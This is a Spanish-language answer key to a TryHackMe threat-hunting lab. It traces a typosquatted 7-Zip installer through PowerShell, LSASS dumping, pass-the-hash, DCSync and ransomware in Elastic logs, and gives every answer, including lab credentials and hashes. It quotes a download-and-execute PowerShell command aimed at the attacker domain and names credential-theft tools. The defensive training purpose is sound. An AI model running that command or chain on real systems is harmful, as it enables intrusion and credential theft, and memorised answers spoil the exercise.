# Hunt Me II: Typo Squatters

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Threat Hunting / DFIR | huntmeiityposquatters | https://tryhackme.com/room/huntmeiityposquatters | 02 Level Medium | TryHackMe | Elastic (ELK), Sysmon, PowerShell, MITRE ATT&CK | Compromiso total del dominio / ransomware |

---

**Contexto:** El 26 de septiembre de 2023, Perry, un ingeniero de software, recibe de su jefe un archivo 7z cifrado con un fragmento de código que debe completar ese mismo día. Como su estación (WKSTN-03) no dispone de una aplicación para descomprimir el archivo, busca en un motor de búsqueda, hace clic en el primer resultado sin validar la legitimidad del origen y lo instala. Los analistas del SOC observan actividad anómala en el endpoint y en los registros de red, y te asignan una investigación en profundidad usando el stack Elastic. La cadena de ataque revela un **typosquatting** (`7zipp.org` en lugar de `7-zip.org`): MSI malicioso → payload PowerShell → servicio persistente (C2) → volcado de LSASS → robo de credenciales → pass-the-hash → movimiento lateral → DCSync sobre el admin del dominio → despliegue de ransomware.

## Solucionario

### Task 1: URL del software malicioso
**Explicación:**

El usuario descarga el instalador falso desde el dominio typosquat. Se filtra con Sysmon Event ID 15 (FileCreateStreamHash); el flujo Zone.Identifier (ADS) contiene la URL de descarga.

Respuesta: `http://www.7zipp.org/a/7z2301-x64.msi`

### Task 2: IP del dominio
**Explicación:**

Se filtra la resolución DNS del dominio malicioso (Sysmon Event ID 22, `dns.question.name: *7zipp*`). El campo `dns.answer.data` revela la IP de la infraestructura del atacante.

Respuesta: `206.189.34.218`

### Task 3: PID del proceso que ejecutó el malware
**Explicación:**

Se busca el evento de creación de proceso (Event ID 1) del instalador `.msi`. El ejecutor de MSI (`msiexec.exe`) aparece con el PID del proceso malicioso.

Respuesta: `2532`

### Task 4: Línea de comandos del segundo payload
**Explicación:**

Siguiendo la cadena de ejecución con `process.pid` / `process.parent.pid`, se encuentra la descarga y ejecución de `7z.ps1` desde PowerShell.

Respuesta: `powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`

### Task 5: Ruta del instalador legítimo
**Explicación:**

El script `7z.ps1` descarga en paralelo la versión legítima de 7-Zip (`7zlegit.exe`, originalmente `7zipinstall.exe`, 0/72 detecciones en VirusTotal) para disfrazar la infección. Se localiza en la carpeta Temp de Windows.

Respuesta: `C:\Windows\Temp\7zlegit.exe`

### Task 6: Servicio instalado
**Explicación:**

Tras soltar el binario legítimo, el script usa `sc.exe` para instalar un servicio malicioso de persistencia. Filtrando por `process.name: sc.exe` se observa la creación del servicio.

Respuesta: `7zService`

### Task 7: Usuario que ejecutó el servicio
**Explicación:**

El servicio implantado se ejecuta bajo el contexto de una cuenta. Se comprueba el campo `user.name` en el evento de arranque del servicio.

Respuesta: `SYSTEM`

### Task 8: Herramienta de parsing de credenciales
**Explicación:**

Tras volcar la memoria de `lsass.exe` (con Invoke-NanoDump, que guarda el dump en disco), el atacante lo parsea para hacer legibles las credenciales. La herramienta usada en esa fase es la respuesta.

Respuesta: `Invoke-PowerExtract`

### Task 9: Par de credenciales (usuario:hash)
**Explicación:**

El atacante descarga SharpHound para descubrimiento de sesiones y ejecuta mimikatz, que posteriormente usa en un ataque **pass-the-hash** con las credenciales extraídas del dump de LSASS.

Respuesta: `james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF`

### Task 10: Nueva contraseña de la cuenta objetivo
**Explicación:**

Con acceso a la cuenta comprometida, el atacante intenta cambiar la contraseña de otra cuenta del dominio. Tras varios intentos con `net.exe`, usa **PowerView** y fija el nuevo valor.

Respuesta: `pwn3dpw!!!`

### Task 11: Estación de trabajo de la cuenta usada
**Explicación:**

El atacante se mueve lateralmente usando la cuenta cuya contraseña acaba de restablecer. El nombre del host donde aparecen los comandos bajo esa cuenta es la respuesta.

Respuesta: `WKSTN-02`

### Task 12: Nuevo par de credenciales descubierto
**Explicación:**

En la nueva estación, el atacante usa SharpChrome/SharpChronium para robar credenciales del navegador y luego ejecuta `net.exe` para buscar el grupo `AD Recovery`. El par descubierto (cuenta con dominio y contraseña) es la respuesta.

Respuesta: `SSF\itadmin:NoO6@39Sk0!`

### Task 13: Script PowerShell para volcar el hash del admin
**Explicación:**

Aparte de mimikatz, el atacante usa un script PowerShell (implementación en C# de tipo mimikatz) para ejecutar un ataque **DCSync** contra el administrador del dominio `damian.hall`.

Respuesta: `Invoke-SharpKatz.ps1`

### Task 14: Hash AES256 del administrador del dominio
**Explicación:**

Del volcado de credenciales por DCSync se extraen los hashes del admin del dominio. Se filtra por `*Invoke-SharpKatz* AND *damian.hall* AND *aes256*` y se lee el valor AES256 en `powershell.command.invocation_details.value`.

Respuesta: `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534`

### Task 15: Archivos cifrados por el ransomware
**Explicación:**

Con acceso de administrador del dominio, el atacante despliega `bomb.exe` (también llamado `777bomb.exe`) en las estaciones. Filtrando por `process.name: bomb.exe` y `event.code: 11` (creación de archivos con extensión `.777zzz`) se cuenta el total de archivos cifrados en todos los hosts.

Respuesta: `46`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | URL del software malicioso descargado | `http://www.7zipp.org/a/7z2301-x64.msi` |
| 2 | IP del dominio que aloja el malware | `206.189.34.218` |
| 3 | PID del proceso que ejecutó el malware | `2532` |
| 4 | Línea de comandos completa del segundo payload | `powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)` |
| 5 | Ruta del instalador legítimo | `C:\Windows\Temp\7zlegit.exe` |
| 6 | Servicio instalado | `7zService` |
| 7 | Usuario que ejecutó el servicio | `SYSTEM` |
| 8 | Herramienta de parsing de credenciales | `Invoke-PowerExtract` |
| 9 | Par de credenciales (usuario:hash) | `james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF` |
| 10 | Nueva contraseña de la cuenta objetivo | `pwn3dpw!!!` |
| 11 | Estación donde se usó la nueva cuenta | `WKSTN-02` |
| 12 | Nuevo par de credenciales (dominio\usuario:password) | `SSF\itadmin:NoO6@39Sk0!` |
| 13 | Script PowerShell de volcado de hash | `Invoke-SharpKatz.ps1` |
| 14 | Hash AES256 del admin del dominio | `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534` |
| 15 | Archivos cifrados por el ransomware | `46` |

---

**Metodología:** Threat hunting sobre telemetría endpooint/red en ELK Stack (Kibana) usando Sysmon (Event ID 1, 11, 15, 22) y registros de PowerShell (4103/4104): reconstrucción de la cadena de ejecución por PID (padre/hijo), localización del origen (typosquatting), volcado y parsing de credenciales, pass-the-hash, movimiento lateral, DCSync y medición de impacto del ransomware.

**Learning chain:** Descarga inicial (typosquatting) → ejecución MSI → PowerShell remoto → instalación legítima + servicio → C2 → volcado LSASS → parsing de credenciales → pass-the-hash → reset de contraseña → movimiento lateral → descubrimiento de credenciales → DCSync (admin dominio) → ransomware.

**Lección:** *Un solo eslabón descuidado por el usuario (instalar desde un typosquat) permite a un adversario pasar de una descarga a administrador del dominio; la correlación de registros por PID reconstruye todo el kill-chain.*

**MITRE ATT&CK:** T1195.001 Supply Chain Compromise (Typosquatting) · T1059.001 PowerShell · T1543.003 Create or Modify System Process: Windows Service · T1003.001 OS Credential Dumping: LSASS Memory · T1550.002 Use Alternate Authentication Material: Pass the Hash · T1098 Account Manipulation · T1021.001 Remote Services · T1003.001 DCSync · T1486 Data Encrypted for Impact.

**Fuente:** [TryHackMe - Hunt Me II: Typo Squatters](https://tryhackme.com/room/huntmeiityposquatters)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.